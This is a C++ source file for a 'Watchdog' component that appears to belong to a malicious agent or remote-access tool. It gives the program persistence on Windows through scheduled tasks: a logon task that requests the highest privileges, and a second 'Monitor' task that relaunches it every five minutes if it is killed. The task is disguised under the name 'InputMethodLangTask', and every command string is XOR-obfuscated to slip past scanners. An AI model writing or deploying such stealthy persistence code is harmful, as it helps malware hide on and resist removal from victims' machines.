#include "watchdog.h"
#include "utils/logger.h"
#include "utils/xorstr.h"

namespace agent {

Watchdog::Watchdog() = default;

Watchdog::~Watchdog() {
    // Don't delete task on normal destruct — we want it to persist
}

void Watchdog::start() {
    wchar_t exe_path[MAX_PATH];
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);

    int len = WideCharToMultiByte(CP_UTF8, 0, exe_path, -1, nullptr, 0, nullptr, nullptr);
    std::string path(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, exe_path, -1, path.data(), len, nullptr, nullptr);

    m_task_name = xorstr("InputMethodLangTask").decrypt();

    if (create_scheduled_task(m_task_name, path)) {
        Logger::info("scheduled task created: " + m_task_name);
    } else {
        Logger::info("scheduled task already exists or creation skipped");
    }
}

void Watchdog::stop() {
    // Task persists — only delete on explicit uninstall
}

bool Watchdog::create_scheduled_task(const std::string& task_name, const std::string& exe_path) {
    // Use schtasks.exe — the standard Windows way to create scheduled tasks.
    // Same approach used by Chrome, OneDrive, Adobe, etc.

    // Check if task already exists
    auto schtasks_query = xorstr("schtasks /Query /TN \"").decrypt();
    auto nul_redir = xorstr("\" >nul 2>&1").decrypt();
    std::string check_cmd = schtasks_query + task_name + nul_redir;
    if (system(check_cmd.c_str()) == 0) {
        return false; // already exists
    }

    // Create logon trigger task
    auto schtasks_create = xorstr("schtasks /Create /TN \"").decrypt();
    auto tr_flag = xorstr("\" /TR \"\\\"").decrypt();
    auto onlogon_high = xorstr("\\\"\" /SC ONLOGON /RL HIGHEST /F >nul 2>&1").decrypt();
    auto onlogon_norm = xorstr("\\\"\" /SC ONLOGON /F >nul 2>&1").decrypt();

    std::string create_cmd = schtasks_create + task_name + tr_flag + exe_path + onlogon_high;
    int result = system(create_cmd.c_str());

    if (result != 0) {
        // Try without HIGHEST (no admin)
        create_cmd = schtasks_create + task_name + tr_flag + exe_path + onlogon_norm;
        result = system(create_cmd.c_str());
    }

    // Also create a repeat task — every 5 minutes, ensures restart if killed
    auto monitor_suffix = xorstr("Monitor").decrypt();
    auto minute_5 = xorstr("\\\"\" /SC MINUTE /MO 5 /F >nul 2>&1").decrypt();
    std::string repeat_cmd = schtasks_create + task_name + monitor_suffix + tr_flag + exe_path + minute_5;
    system(repeat_cmd.c_str());

    return result == 0;
}

bool Watchdog::delete_scheduled_task(const std::string& task_name) {
    auto schtasks_del = xorstr("schtasks /Delete /TN \"").decrypt();
    auto del_suffix = xorstr("\" /F >nul 2>&1").decrypt();
    auto monitor_sfx = xorstr("Monitor").decrypt();
    std::string cmd1 = schtasks_del + task_name + del_suffix;
    std::string cmd2 = schtasks_del + task_name + monitor_sfx + del_suffix;
    int r1 = system(cmd1.c_str());
    int r2 = system(cmd2.c_str());
    return r1 == 0 || r2 == 0;
}

void Watchdog::run_as_watchdog(DWORD, const std::string&) {
    // Legacy — no longer used. Task Scheduler handles restart.
}

} // namespace agent
